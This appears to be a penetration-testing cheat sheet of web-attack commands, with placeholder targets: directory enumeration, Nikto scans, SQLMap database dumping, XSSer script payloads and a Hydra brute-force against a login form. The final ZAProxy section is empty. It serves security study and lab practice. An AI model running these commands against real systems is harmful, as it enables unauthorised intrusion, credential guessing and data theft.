###### Web and HTTP Protocol
- `dirb http://IP`
- `curl -X GET IP/URL` -- GET request
- `curl -I IP/URL` -- HEAD request
- `curl -X OPTIONS IP/URL`
- `curl URL --upload-file hello.txt` -- to upload file
###### Directory Enumeration with Gobuster
- `gobuster dir -u URL -w /path/to/wordlist`
- `gobuster dir -u URL -w /path/to/wordlist -b 404,403`
- `gobuster dir -u URL -w /path/to/wordlist -b 404,403 -x .php,.xml,.txt -r`
###### Scanning Web Application with Nikto
- `nikto -h URL`
- `nikto -h URL -Tuning 5 -Display V` -- scan for file inclusion
- `nikto -h URL -Tuning 5 -Display V -o nikto.html -Frmat htm`
###### SQL Injection with SQLMap
- `sqlmap -u "URL" --cookie "" -p title`
- `sqlmap -u "URL" --cookie "" -p title --dbs` -- give database info
- `sqlmap -u "URL" --cookie "" -p title -D [db name] --tables` -- give table info
- `sqlmap -u "URL" --cookie "" -p title -D [db name] -T [table name] --columns` -- give columns info of a particular table
- `sqlmap -u "URL" --cookie "" -p title -D [db name] -T [table name] -C [cloumn,names,to,dump] --dump` -- to give data info
- save the request and pass in sqlmap
	- `sqlmap -r file -p title`
###### XSS Attack with XSSer
- always add XSS in the parameter where you want to test XSS
- `xsser --url "" -p "[add the parameter]"` 
- `xsser --url "" -p "[add the parameter]" --auto`
- `xsser --url "" -p "[add the parameter]" --Fp "<script>alert(0)</script>"`
###### Authenticated XSS Attack with XSSer
- `xsser --url "" -p "[add the parameter]" --cookie=""`  
- `xsser --url "" -p "[add the parameter]" --cookie="" --Fp "<script>alert(0)</script>"`
###### Attacking HTTP Login Form with Hydra
- `hydra -L usernames -P passwords 192.208.137.3 http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"`
###### Attacking HTTP Login Form with ZAProxy
- 